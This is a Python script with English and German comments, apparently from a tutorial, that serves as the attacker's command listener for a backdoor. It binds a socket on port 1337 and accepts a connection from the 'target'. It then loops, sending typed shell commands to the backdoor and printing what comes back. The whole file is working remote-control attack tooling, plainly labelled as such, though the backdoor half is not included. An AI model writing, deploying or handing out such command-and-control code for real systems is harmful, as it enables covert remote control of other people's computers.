# This is the sender, which the attacker will use to send the commands to the Backdoor
# Das ist der Sender, den der Attackierende nutzt, um die Befehle zur Backdoor zu senden


# # # # # # #
#  imports  #
# # # # # # #
from socket import *
import socket
# no installation needed

# At first we'll define two variables, which will be the server and the port we are connecting to. 127.0.0.1 is the localHost, so the local Computer. You can use a custom port, but make sure that the Backdoor has the same
# Als erstest  definieren wir zwei Variablen, welche der Server und der Port sind, mit dem wir uns verbinden. 127.0.0.1 ist der localHost, also der lokale Computer. Als Port kannst du einen benutzerdefinierten Port benutzen,
# beachte jedoch, dass die Backdoor auf dem gleichen Port ist
host = "127.0.0.1"
port = 1337

# Here we are setting up the connection, to recieve and accept the connection from the target
# Hier bauen wir die Verbindung auf, um die Verbindung des Ziels zu empfangen und zu akzeptieren
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))
s.listen(3)
connection, addr = s.accept()
# if the target connected to us, it'll print out that it is connected and display the address
print("Connected with " + addr[0])
data = connection.recv(2024)
print(data)

# Here we are using a while loop, to keep the data sending and recieving alive
# Hier benutzen wir eine While Schleife, um die Datenübertragung am Leben zu halten
while True:
    # This is the input for the commands
    # Das ist der input für die Befehle
    cmd = input("Command: ")

    # Dieser Befehl wird dann mit der send Methode an die Backdoor gesendet
    connection.send(str.encode(cmd))
    data = connection.recv(2024)
    print(data.decode("utf-8"))
connection.close()
